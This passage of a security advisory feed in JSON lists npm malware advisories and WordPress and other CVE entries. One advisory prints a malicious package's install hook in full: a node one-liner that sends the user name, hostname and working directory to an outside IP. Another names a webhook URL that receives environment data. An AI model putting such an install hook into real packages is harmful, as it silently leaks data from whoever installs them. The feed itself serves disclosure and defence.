-          "url": "https://github.com/ossf/malicious-packages/blob/116e199a1fd3042c7e83e59c4d3ce70c68428d6d/osv/malicious/npm/mui-wrapper-x-date-pickers/MAL-2026-18369.json"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://github.com/ossf/malicious-packages/blob/cc8ee308c3a331b6848b53a312a11cd5dc39dd54/osv/malicious/npm/mui-wrapper-x-date-pickers/MAL-2026-18369.json"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://www.npmjs.com/package/mui-wrapper-x-date-pickers/v/1.0.0"
-        }
-      ],
-      "exploitation": "Malicious software distribution advisory; investigate exposure",
-      "kind": "advisory",
-      "cvss": null,
-      "status": "GitHub malware advisory",
-      "first_seen_at": "2026-10-29T10:01:28Z",
-      "source_updated_at": "2026-10-29T15:31:32Z",
-      "source_type": "github",
-      "known_exploited": false
-    },
-    {
-      "id": "GHSA-4h9g-fh86-j87q",
-      "title": "Malicious code in mw-communication-client (npm)",
-      "severity": "bulletin",
-      "categories": [
-        "Application dependencies",
-        "Node.js / npm"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "mw-communication-client was published to npm on 2026-10-27 from 06:55:13 UTC by the account amahrou1w, about one minute after npm's staged-publish placeholder 0.0.0-stage, in versions 10.0.0, 1.0.1. The three packages mw-test-utils, mw-communication-client and mui-wrapper-x-date-pickers were published by the same account within eight minutes and are identical apart from the name. Each tarball has three files: index.js (module.exports = {}), README.md and package.json. The package has no repository, no functional code and no dependencies, and 1.0.1 is the latest version at the time of this report. package.json declares a preinstall and a postinstall script, which npm runs on every install: node -e \"require('http').get('http://38.242.235.206/depconf/mw-communication-client/preinstall?u='+encodeURIComponent(process.env.USER||process.env.USERNAME||'')+'&h='+encodeURIComponent(require('os').hostname())+'&p='+encodeURIComponent(process.cwd())).on('error',()=>{})\" The postinstall script is the same request with the path /postinstall. Each install therefore sends the user name, the host name and the working directory of the installing machine over plain HTTP to the IP address 38.242.235.206. The README and the package description call the package a dependency-confusion proof of concept f",
-      "affected": "npm: mw-communication-client (= 10.0.0); npm: mw-communication-client (= 1.0.1)",
-      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
-      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
-      "sources": [
-        {
-          "label": "GitHub malware advisory",
-          "url": "https://github.com/advisories/GHSA-4h9g-fh86-j87q"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://github.com/ossf/malicious-packages/blob/116e199a1fd3042c7e83e59c4d3ce70c68428d6d/osv/malicious/npm/mw-communication-client/MAL-2026-18370.json"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://github.com/ossf/malicious-packages/blob/cc8ee308c3a331b6848b53a312a11cd5dc39dd54/osv/malicious/npm/mw-communication-client/MAL-2026-18370.json"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://www.npmjs.com/package/mw-communication-client/v/1.0.1"
-        }
-      ],
-      "exploitation": "Malicious software distribution advisory; investigate exposure",
-      "kind": "advisory",
-      "cvss": null,
-      "status": "GitHub malware advisory",
-      "first_seen_at": "2026-10-29T10:01:28Z",
-      "source_updated_at": "2026-10-29T15:31:32Z",
-      "source_type": "github",
-      "known_exploited": false
-    },
-    {
-      "id": "GHSA-2pph-m662-c8hg",
-      "title": "Malicious code in @zmtcdn/components (npm)",
-      "severity": "bulletin",
-      "categories": [
-        "Application dependencies",
-        "Node.js / npm"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "@zmtcdn/components@9999.0.0 is a dependency-confusion package with an empty `index.js` and a description of \"Security research PoC\". Its postinstall script runs `node postinstall.js` on npm install, which POSTs the hostname, username, platform, working directory and the names of all environment variables to `https://webhook.site/f52af355-4783-4acb-9de1-5e44b5963025`. It was published by the npm account kill_shs, which also published @zmtcdn/ui with the same script. --- Credit: [OpenSSF](https://github.com/ossf/malicious-packages) ([source](https://github.com/ossf/malicious-packages/blob/5fc19d9dd8702ac6a94139396a2d6be32a245bd7/osv/malicious/npm/@zmtcdn/components/MAL-2026-18372.json))",
-      "affected": "npm: @zmtcdn/components (= 9999.0.0)",
-      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
-      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
-      "sources": [
-        {
-          "label": "GitHub malware advisory",
-          "url": "https://github.com/advisories/GHSA-2pph-m662-c8hg"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://github.com/ossf/malicious-packages/blob/5fc19d9dd8702ac6a94139396a2d6be32a245bd7/osv/malicious/npm/@zmtcdn/components/MAL-2026-18372.json"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://www.npmjs.com/package/@zmtcdn/components"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://github.com/ossf/malicious-packages/blob/cc8ee308c3a331b6848b53a312a11cd5dc39dd54/osv/malicious/npm/@zmtcdn/components/MAL-2026-18372.json"
-        }
-      ],
-      "exploitation": "Malicious software distribution advisory; investigate exposure",
-      "kind": "advisory",
-      "cvss": null,
-      "status": "GitHub malware advisory",
-      "first_seen_at": "2026-10-29T10:01:28Z",
-      "source_updated_at": "2026-10-29T15:31:32Z",
-      "source_type": "github",
-      "known_exploited": false
-    },
-    {
-      "id": "CVE-2026-115303",
-      "title": "The Contact Form by Supsystic WordPress plugin before 1.11.1 does not strip CR/LF characters or re-validate submitted field values before concatenating them into outgoing emai",
-      "severity": "low",
-      "categories": [
-        "WordPress / Plugins"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "The Contact Form by Supsystic WordPress plugin before 1.11.1 does not strip CR/LF characters or re-validate submitted field values before concatenating them into outgoing email headers when a form is configured to map a submitted field into its Reply-To, From or Cc header, allowing unauthenticated users to inject arbitrary email headers such as additional Bcc or Cc recipients into the notification email.",
-      "affected": "Confirm affected versions from the vendor advisory and NVD CPE configurations.",
-      "remediation": "Review the linked vendor bulletin for patched versions and mitigations. This feed does not infer a fixed version.",
-      "action": "Verify applicability against the installed product and version, then follow vendor remediation instructions.",
-      "sources": [
-        {
-          "label": "NVD CVE record",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-115303"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "3.7",
-      "status": "NVD indexed CVE",
-      "first_seen_at": "2026-10-29T10:01:28Z",
-      "source_updated_at": "2026-10-29T15:18:27.920",
-      "source_type": "nvd",
-      "known_exploited": false,
-      "epss": 0.00224,
-      "epss_percentile": 0.13077,
-      "epss_as_of": "2026-11-04"
-    },
-    {
-      "id": "CVE-2026-7190",
-      "title": "A cross-site scripting (XSS) vulnerability in the ICTBroadcast software, which affects the demo environment",
-      "severity": "medium",
-      "categories": [
-        "JavaScript / TypeScript",
-        "PHP"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "A cross-site scripting (XSS) vulnerability in the ICTBroadcast software, which affects the demo environment. The vulnerability is found in the ‘login.php’ endpoint, where the ‘editForm[extension_username]’ parameter is reflected in the response without proper filtering. Successful exploitation of this vulnerability could allow an attacker to execute arbitrary JavaScript code in the victim’s browser once the victim accesses the malicious URL.",
-      "affected": "Confirm affected versions from the vendor advisory and NVD CPE configurations.",
-      "remediation": "Review the linked vendor bulletin for patched versions and mitigations. This feed does not infer a fixed version.",
-      "action": "Verify applicability against the installed product and version, then follow vendor remediation instructions.",
-      "sources": [
-        {
-          "label": "NVD CVE record",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-7190"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "5.1",
-      "status": "NVD indexed CVE",
-      "first_seen_at": "2026-10-29T10:01:28Z",
-      "source_updated_at": "2026-10-29T16:01:04.213",
-      "source_type": "nvd",
-      "known_exploited": false,
-      "epss": 0.00335,
-      "epss_percentile": 0.26988,
-      "epss_as_of": "2026-11-04"
-    },
-    {
-      "id": "CVE-2026-103485",
-      "title": "The Extensions for Leaflet Map plugin for WordPress is vulnerable to Stored DOM-Based Cross-Site Scripting via the 'feature.properties[<template-token>]' parameter in all vers",
-      "severity": "medium",
-      "categories": [
-        "WordPress / Plugins"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "The Extensions for Leaflet Map plugin for WordPress is vulnerable to Stored DOM-Based Cross-Site Scripting via the 'feature.properties[<template-token>]' parameter in all versions up to, and including, 5.4 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. Exploitation requires that a site administrator has previously configured a public map using the [leaflet-map]+[leaflet-geojson]+[choropleth] shortcode combination whose GeoJSON src URL is one the attacker controls — for example, through compromise of an external data host, a subdomain takeover, or a site intentionally pointing at an attacker-hosted feed.",
-      "affected": "Confirm affected versions from the vendor advisory and NVD CPE configurations.",
-      "remediation": "Review the linked vendor bulletin for patched versions and mitigations. This feed does not infer a fixed version.",
-      "action": "Verify applicability against the installed product and version, then follow vendor remediation instructions.",
-      "sources": [
-        {
-          "label": "NVD CVE record",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-103485"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "5.4",
-      "status": "NVD indexed CVE",
-      "first_seen_at": "2026-10-29T10:29:51Z",
-      "source_updated_at": "2026-10-29T14:56:26.107",
-      "source_type": "nvd",
-      "known_exploited": false,
-      "epss": 0.00341,
-      "epss_percentile": 0.27681,
-      "epss_as_of": "2026-11-04"
-    },
-    {
-      "id": "CVE-2026-103875",
-      "title": "The Media Library Assistant plugin for WordPress is vulnerable to Reflected Cross-Site Scripting via the 'search-string' parameter in all versions up to, and including, 3.42 d",
-      "severity": "medium",
-      "categories": [
-        "WordPress / Plugins"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "The Media Library Assistant plugin for WordPress is vulnerable to Reflected Cross-Site Scripting via the 'search-string' parameter in all versions up to, and including, 3.42 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that execute if they can successfully trick a user into performing an action such as clicking on a link. Exploitation requires the targeted site to have a publicly accessible page containing an [mla_gallery] shortcode configured with a pagination output mode and an mla_link_href template that reflects a {+request:...+} token, along with enough attachments to trigger pagination.",
-      "affected": "Confirm affected versions from the vendor advisory and NVD CPE configurations.",
-      "remediation": "Review the linked vendor bulletin for patched versions and mitigations. This feed does not infer a fixed version.",
-      "action": "Verify applicability against the installed product and version, then follow vendor remediation instructions.",
-      "sources": [
-        {
-          "label": "NVD CVE record",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-103875"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "4.7",
-      "status": "NVD indexed CVE",
-      "first_seen_at": "2026-10-29T10:29:51Z",
-      "source_updated_at": "2026-10-29T14:56:26.107",
-      "source_type": "nvd",
-      "known_exploited": false,
-      "epss": 0.00304,
-      "epss_percentile": 0.23292,
-      "epss_as_of": "2026-11-04"
-    },
-    {
-      "id": "CVE-2026-104727",
-      "title": "The Sequential Order Numbers for WooCommerce plugin for WordPress is vulnerable to Stored Cross-Site Scripting via 'condition' Post Meta Array Keys in all versions up to, and ",
-      "severity": "medium",
-      "categories": [
-        "WordPress / Plugins"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "The Sequential Order Numbers for WooCommerce plugin for WordPress is vulnerable to Stored Cross-Site Scripting via 'condition' Post Meta Array Keys in all versions up to, and including, 3.6.5 due to insufficient input sanitization and output escaping. This makes it possible for authenticated attackers, with contributor-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.",
-      "affected": "Confirm affected versions from the vendor advisory and NVD CPE configurations.",
-      "remediation": "Review the linked vendor bulletin for patched versions and mitigations. This feed does not infer a fixed version.",
-      "action": "Verify applicability against the installed product and version, then follow vendor remediation instructions.",
-      "sources": [
-        {
-          "label": "NVD CVE record",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-104727"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "6.4",
-      "status": "NVD indexed CVE",
-      "first_seen_at": "2026-10-29T10:29:51Z",
-      "source_updated_at": "2026-10-29T14:56:26.107",
-      "source_type": "nvd",
-      "known_exploited": false,
-      "epss": 0.00252,
-      "epss_percentile": 0.16719,
-      "epss_as_of": "2026-11-04"
-    },
-    {
-      "id": "CVE-2026-107627",
-      "title": "The Greenshift – animation and page builder blocks plugin for WordPress is vulnerable to Stored DOM-Based Cross-Site Scripting via the 'comment' parameter in all versions up t",
-      "severity": "medium",
-      "categories": [
-        "WordPress / Plugins"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "The Greenshift – animation and page builder blocks plugin for WordPress is vulnerable to Stored DOM-Based Cross-Site Scripting via the 'comment' parameter in all versions up to, and including, 13.2.1 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. Exploitation requires an administrator to have published a page containing a Text Animated block with Content set to Blocks, a Latest Comments block with excerpts enabled nested inside it, and at least one Animated Texts value configured — conditions that cause the gs-textanimate script to be enqueued and process the comment excerpts.",
-      "affected": "Confirm affected versions from the vendor advisory and NVD CPE configurations.",
-      "remediation": "Review the linked vendor bulletin for patched versions and mitigations. This feed does not infer a fixed version.",
-      "action": "Verify applicability against the installed product and version, then follow vendor remediation instructions.",
-      "sources": [
-        {
-          "label": "NVD CVE record",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-107627"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "5.4",
-      "status": "NVD indexed CVE",
-      "first_seen_at": "2026-10-29T10:29:51Z",
-      "source_updated_at": "2026-10-29T14:56:26.107",
-      "source_type": "nvd",
-      "known_exploited": false,
-      "epss": 0.0033,
-      "epss_percentile": 0.26255,
-      "epss_as_of": "2026-11-04"
-    },
-    {
-      "id": "CVE-2026-107629",
-      "title": "The Greenshift – animation and page builder blocks plugin for WordPress is vulnerable to Stored DOM-Based Cross-Site Scripting via the 'comment' parameter in all versions up t",
-      "severity": "medium",
-      "categories": [
-        "WordPress / Plugins"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "The Greenshift – animation and page builder blocks plugin for WordPress is vulnerable to Stored DOM-Based Cross-Site Scripting via the 'comment' parameter in all versions up to, and including, 13.2.1 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. Exploitation requires the affected post page to include an Advanced HTML Element block with Split Text animation enabled wrapping a Latest Comments block that displays comment excerpts, as this configuration causes splittext.js to be enqueued and to process the comment content container.",
-      "affected": "Confirm affected versions from the vendor advisory and NVD CPE configurations.",
-      "remediation": "Review the linked vendor bulletin for patched versions and mitigations. This feed does not infer a fixed version.",
-      "action": "Verify applicability against the installed product and version, then follow vendor remediation instructions.",
-      "sources": [
-        {
-          "label": "NVD CVE record",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-107629"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "5.4",
-      "status": "NVD indexed CVE",
-      "first_seen_at": "2026-10-29T10:29:51Z",
-      "source_updated_at": "2026-10-29T14:56:26.107",
-      "source_type": "nvd",
-      "known_exploited": false,
-      "epss": 0.00341,
-      "epss_percentile": 0.27681,
-      "epss_as_of": "2026-11-04"
-    },
-    {
-      "id": "CVE-2026-107743",
-      "title": "The Mapster WP Maps plugin for WordPress is vulnerable to Stored Cross-Site Scripting in versions up to, and including, 2.0.5",
-      "severity": "high",
-      "categories": [
-        "WordPress / Plugins"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "The Mapster WP Maps plugin for WordPress is vulnerable to Stored Cross-Site Scripting in versions up to, and including, 2.0.5. This is due to the /wp-json/mapster-wp-maps/save-mapmaker REST route being registered with a permission_callback that unconditionally returns true (no capability check, no nonce), together with the mapster_write_config_to_acf() helper only sanitizing string config values with sanitize_text_field() — which strips HTML tags but leaves quote characters intact — and the mapster_wp_map shortcode renderer in mapster_wordpress_maps_shortcode_display() concatenating the stored loading_background_color value into a single-quoted inline style attribute without esc_attr(). This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.",
-      "affected": "Confirm affected versions from the vendor advisory and NVD CPE configurations.",
-      "remediation": "Review the linked vendor bulletin for patched versions and mitigations. This feed does not infer a fixed version.",
-      "action": "Verify applicability against the installed product and version, then follow vendor remediation instructions.",
-      "sources": [
-        {
-          "label": "NVD CVE record",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-107743"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "7.2",
-      "status": "NVD indexed CVE",
-      "first_seen_at": "2026-10-29T10:29:51Z",
-      "source_updated_at": "2026-10-29T14:56:26.107",
-      "source_type": "nvd",
-      "known_exploited": false,
-      "epss": 0.00401,
-      "epss_percentile": 0.34385,
-      "epss_as_of": "2026-11-04"
-    },
-    {
-      "id": "CVE-2026-109215",
-      "title": "The LiteSpeed Cache plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the 'bbp_reply_content' parameter in all versions up to, and including, 7.9.1 due to ",
-      "severity": "medium",
-      "categories": [
-        "WordPress / Plugins"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "The LiteSpeed Cache plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the 'bbp_reply_content' parameter in all versions up to, and including, 7.9.1 due to insufficient input sanitization and output escaping. This makes it possible for authenticated attackers, with subscriber-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. Exploitation requires that an administrator has enabled Viewport Images (VPI) and configured a VPI filename that matches an image the attacker can embed in user-generated content — such as a bbPress topic where Subscriber-level Participants are permitted to post replies containing raw img tags.",
-      "affected": "Confirm affected versions from the vendor advisory and NVD CPE configurations.",
-      "remediation": "Review the linked vendor bulletin for patched versions and mitigations. This feed does not infer a fixed version.",
-      "action": "Verify applicability against the installed product and version, then follow vendor remediation instructions.",
-      "sources": [
-        {
-          "label": "NVD CVE record",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-109215"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "6.4",
-      "status": "NVD indexed CVE",
-      "first_seen_at": "2026-10-29T10:29:51Z",
-      "source_updated_at": "2026-10-29T14:56:26.107",
-      "source_type": "nvd",
-      "known_exploited": false,
-      "epss": 0.00334,
-      "epss_percentile": 0.26847,
-      "epss_as_of": "2026-11-04"
-    },
-    {
-      "id": "CVE-2026-110707",
-      "title": "The RSS Aggregator by Feedzy – Feed to Post, Autoblogging, News & YouTube Video Feeds Aggregator plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the 'med",
-      "severity": "medium",
-      "categories": [
-        "WordPress / Plugins"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "The RSS Aggregator by Feedzy – Feed to Post, Autoblogging, News & YouTube Video Feeds Aggregator plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the 'media:group/media:description (XML element in the imported feed)' parameter in all versions up to, and including, 5.2.12 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. Exploitation requires an administrator to configure a Feed-to-Post import pointing at an attacker-controlled feed URL and trigger the import via the Run Now action or setup wizard, which is the plugin's standard configuration flow.",
-      "affected": "Confirm affected versions from the vendor advisory and NVD CPE configurations.",
-      "remediation": "Review the linked vendor bulletin for patched versions and mitigations. This feed does not infer a fixed version.",
-      "action": "Verify applicability against the installed product and version, then follow vendor remediation instructions.",
-      "sources": [
-        {
-          "label": "NVD CVE record",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-110707"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "4.7",
-      "status": "NVD indexed CVE",
-      "first_seen_at": "2026-10-29T10:29:51Z",
-      "source_updated_at": "2026-10-29T14:56:26.107",
-      "source_type": "nvd",
-      "known_exploited": false,
-      "epss": 0.00304,
-      "epss_percentile": 0.23292,
-      "epss_as_of": "2026-11-04"
-    },
-    {
-      "id": "CVE-2026-111318",
-      "title": "The HT Mega Addons for Elementor – Elementor Widgets & Template Builder plugin for WordPress is vulnerable to Stored DOM-Based Cross-Site Scripting via the 'href attribute of ",
-      "severity": "medium",
-      "categories": [
-        "WordPress / Plugins"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "The HT Mega Addons for Elementor – Elementor Widgets & Template Builder plugin for WordPress is vulnerable to Stored DOM-Based Cross-Site Scripting via the 'href attribute of <a> inside .htmega-tab-nav' parameter in all versions up to, and including, 3.2.7 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. Successful exploitation requires a co-installed plugin such as wpDiscuz with its rich editor enabled whose markup allowlist permits span[class] and a[href] storage, an HT Mega Tabs widget present on the same page as the comment section, and a victim user click on the injected anchor link.",
-      "affected": "Confirm affected versions from the vendor advisory and NVD CPE configurations.",
-      "remediation": "Review the linked vendor bulletin for patched versions and mitigations. This feed does not infer a fixed version.",
-      "action": "Verify applicability against the installed product and version, then follow vendor remediation instructions.",
-      "sources": [
-        {
-          "label": "NVD CVE record",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-111318"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "5.4",
-      "status": "NVD indexed CVE",
-      "first_seen_at": "2026-10-29T10:29:51Z",
-      "source_updated_at": "2026-10-29T14:56:26.107",
-      "source_type": "nvd",
-      "known_exploited": false,
-      "epss": 0.00272,
-      "epss_percentile": 0.1958,
-      "epss_as_of": "2026-11-04"
-    },
-    {
-      "id": "CVE-2026-116763",
-      "title": "The LiteSpeed Cache plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the 'comment' parameter in all versions up to, and including, 7.9.1 due to insufficie",
-      "severity": "medium",
-      "categories": [
-        "WordPress / Plugins"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "The LiteSpeed Cache plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the 'comment' parameter in all versions up to, and including, 7.9.1 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. This vulnerability is only exploitable when the HTML Minify option (O_OPTM_HTML_MIN) is enabled and a companion plugin renders stored comment content into a raw-text context such as a JSON-LD script block on the same page.",
-      "affected": "Confirm affected versions from the vendor advisory and NVD CPE configurations.",
-      "remediation": "Review the linked vendor bulletin for patched versions and mitigations. This feed does not infer a fixed version.",
-      "action": "Verify applicability against the installed product and version, then follow vendor remediation instructions.",
-      "sources": [
-        {
-          "label": "NVD CVE record",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-116763"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "5.4",
-      "status": "NVD indexed CVE",
-      "first_seen_at": "2026-10-29T10:29:51Z",
-      "source_updated_at": "2026-10-29T14:56:26.107",
-      "source_type": "nvd",
-      "known_exploited": false,
-      "epss": 0.00341,
-      "epss_percentile": 0.27681,
-      "epss_as_of": "2026-11-04"
-    },
-    {
-      "id": "CVE-2026-118192",
-      "title": "The JoomSport – for Sports: Team & League, Football, Hockey & more plugin for WordPress is vulnerable to generic SQL Injection via the 'team_id' parameter in all versions up t",
-      "severity": "medium",
-      "categories": [
-        "WordPress / Plugins"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "The JoomSport – for Sports: Team & League, Football, Hockey & more plugin for WordPress is vulnerable to generic SQL Injection via the 'team_id' parameter in all versions up to, and including, 5.7.11 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for authenticated attackers, with contributor-level access and above, to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database. The vulnerable code path is reached when the season has no associated joomsport_tournament term, which is the default state for newly created seasons.",
-      "affected": "Confirm affected versions from the vendor advisory and NVD CPE configurations.",
-      "remediation": "Review the linked vendor bulletin for patched versions and mitigations. This feed does not infer a fixed version.",
-      "action": "Verify applicability against the installed product and version, then follow vendor remediation instructions.",
-      "sources": [
-        {
-          "label": "NVD CVE record",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-118192"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "6.5",
-      "status": "NVD indexed CVE",
-      "first_seen_at": "2026-10-29T10:29:51Z",
-      "source_updated_at": "2026-10-29T14:56:26.107",
-      "source_type": "nvd",
-      "known_exploited": false,
-      "epss": 0.00442,
-      "epss_percentile": 0.38455,
-      "epss_as_of": "2026-11-04"
-    },
-    {
-      "id": "CVE-2026-88941",
-      "title": "Kaspersky has fixed a vulnerability in the Network Agent for Windows module of Kaspersky Security Center",
-      "severity": "medium",
-      "categories": [
-        "Windows"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "Kaspersky has fixed a vulnerability in the Network Agent for Windows module of Kaspersky Security Center. The vulnerability could potentially cause the Network Agent module of Kaspersky Security Center to malfunction. There are no evidence of the vulnerability exploitation in-the-wild.",
-      "affected": "Confirm affected versions from the vendor advisory and NVD CPE configurations.",
-      "remediation": "Review the linked vendor bulletin for patched versions and mitigations. This feed does not infer a fixed version.",
-      "action": "Verify applicability against the installed product and version, then follow vendor remediation instructions.",
-      "sources": [
-        {
-          "label": "NVD CVE record",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-88941"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "6.2",
-      "status": "NVD indexed CVE",
-      "first_seen_at": "2026-10-29T10:29:51Z",
-      "source_updated_at": "2026-10-29T16:19:37.750",
-      "source_type": "nvd",
-      "known_exploited": false,
-      "epss": 0.00144,
-      "epss_percentile": 0.03689,
-      "epss_as_of": "2026-11-04"
-    },
-    {
-      "id": "CVE-2026-91152",
-      "title": "The Everest Forms – Contact Form, Payment Form, Quiz, Survey & Custom Form Builder with AI plugin for WordPress is vulnerable to Reflected Cross-Site Scripting via the 'evf_to",
-      "severity": "medium",
-      "categories": [
-        "WordPress / Plugins"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "The Everest Forms – Contact Form, Payment Form, Quiz, Survey & Custom Form Builder with AI plugin for WordPress is vulnerable to Reflected Cross-Site Scripting via the 'evf_toast_type' parameter in all versions up to, and including, 3.6.2 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that execute if they can successfully trick a user into performing an action such as clicking on a link. Exploitation requires the sibling evf_toast parameter to decode successfully via atob(), but this is a trivially attacker-controlled prerequisite.",
-      "affected": "Confirm affected versions from the vendor advisory and NVD CPE configurations.",
-      "remediation": "Review the linked vendor bulletin for patched versions and mitigations. This feed does not infer a fixed version.",
-      "action": "Verify applicability against the installed product and version, then follow vendor remediation instructions.",
-      "sources": [
-        {
-          "label": "NVD CVE record",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-91152"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "6.1",
-      "status": "NVD indexed CVE",
-      "first_seen_at": "2026-10-29T10:29:51Z",
-      "source_updated_at": "2026-10-29T14:56:26.107",
-      "source_type": "nvd",
-      "known_exploited": false,
-      "epss": 0.00346,
-      "epss_percentile": 0.28269,
-      "epss_as_of": "2026-11-04"
-    },
-    {
-      "id": "CVE-2026-91153",
-      "title": "The Everest Forms – Contact Form, Payment Form, Quiz, Survey & Custom Form Builder with AI plugin for WordPress is vulnerable to Sensitive Information Exposure in all versions",
-      "severity": "medium",
-      "categories": [
-        "AWS",
-        "WordPress / Plugins"
-      ],
-      "published": "2026-10-29",
-      "updated": "2026-10-29",
-      "summary": "The Everest Forms – Contact Form, Payment Form, Quiz, Survey & Custom Form Builder with AI plugin for WordPress is vulnerable to Sensitive Information Exposure in all versions up to, and including, 3.6.2 via the process. This makes it possible for unauthenticated attackers to extract arbitrary WordPress post meta values — including license keys, API tokens, SMTP credentials, and Stripe or AWS secrets stored on any post type — via form submission notification emails or stored entries. The submission nonce is publicly rendered in every embedded form and can additionally be minted anonymously via the nopriv everest_forms_get_form_update_nonce action, meaning no account or prior authentication of any kind is required to complete the exploit.",
-      "affected": "Confirm affected versions from the vendor advisory and NVD CPE configurations.",
-      "remediation": "Review the linked vendor bulletin for patched versions and mitigations. This feed does not infer a fixed version.",
-      "action": "Verify applicability against the installed product and version, then follow vendor remediation instructions.",
-      "sources": [
-        {
-          "label": "NVD CVE record",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-91153"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "5.3",
-      "status": "NVD indexed CVE",
-      "first_seen_at": "2026-10-29T10:29:51Z",
-      "source_updated_at": "2026-10-29T14:56:26.107",
